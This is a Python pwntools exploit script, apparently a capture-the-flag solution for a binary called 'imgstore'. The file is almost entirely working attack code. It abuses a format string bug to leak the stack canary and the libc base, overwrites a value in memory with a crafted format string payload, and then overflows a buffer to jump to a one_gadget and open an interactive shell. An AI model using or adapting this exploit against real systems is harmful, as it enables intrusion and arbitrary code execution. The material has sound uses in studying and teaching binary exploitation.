#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

# Set up pwntools for the correct files
exe = './imgstore'
elf = context.binary = ELF(exe)

libc = elf.libc

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# format string vulnerability

# Step 1: Leak canary & libc address

io.sendlineafter(b">> ", b"3")

io.sendlineafter(b"Enter book title: ", b"AAAAAAAA %15$p %17$p %25$p")

io.recvuntil(b"AAAAAAAA ")
line = io.recvline(keepends=False).split(b" ")

overwrite_addr = int(line[0], 16) - 0x78
canary = int(line[1], 16)
libc.address = int(line[2], 16) - (libc.symbols["__libc_start_main"] + 243)

print(
    f"Overwrite address: {hex(overwrite_addr)} | Canary: {hex(canary)} | Libc address: {hex(libc.address)}")

# Step 2: Overwrite

io.sendlineafter(b"[y/n]: ", b"y")

val = (0xfeedbeef * pow(0x13f5c223, -1, 2 ** 32)) % (2 ** 32)  # 0x8c87dec5

write = {overwrite_addr: val}
payload = fmtstr_payload(8, write, numbwritten=0, write_size='short')

io.sendlineafter(b"Enter book title: ", payload)

# Step 3: Buffer overflow

io.sendlineafter(b">", flat(
    b"A" * 104,
    canary,
    b"A" * 8,
    libc.address + 0xe3b01  # one_gadget
))

io.interactive()
